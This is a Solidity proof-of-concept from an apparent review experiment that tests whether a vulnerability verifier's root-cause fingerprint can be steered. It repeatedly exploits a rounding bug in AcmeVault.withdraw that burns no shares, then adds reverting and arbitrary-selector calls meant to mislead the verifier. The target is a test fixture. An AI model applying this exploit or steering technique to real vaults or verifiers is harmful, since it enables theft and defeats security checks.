// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// REVIEW EXPERIMENT (local branch review/mec1-steering, never pushed). Tests whether the verifier's
// root-cause fingerprint can be steered: the fixture's declared known issue (AcmeVault.withdraw
// rounding) is broken as usual, the share price is restored inside a frame that reverts, and then any
// call with any selector is made. A sound fingerprint keeps (share_price, AcmeVault.withdraw).

import {AcmeVault} from "../../src/acme/AcmeVault.sol";

interface IERC20Min {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract SteerHelper {
    /// Restores the share price with a real entry call (donateYield), then reverts the whole frame.
    function restoreThenRevert(AcmeVault vault, IERC20Min usd, uint256 amount) external {
        usd.approve(address(vault), amount);
        vault.donateYield(amount);
        revert("undo the restoration");
    }
}

contract PocSteer {
    constructor(AcmeVault vault, IERC20Min usd, uint256 times, bytes4 anySelector) {
        for (uint256 i; i < times; ++i) vault.withdraw(1); // the known issue: burns nothing
        SteerHelper h = new SteerHelper();
        usd.transfer(address(h), times);
        try h.restoreThenRevert(vault, usd, times) {} catch {}
        (bool ok,) = address(vault).call(abi.encodePacked(anySelector)); // reverts: no such function
        ok;
    }
}
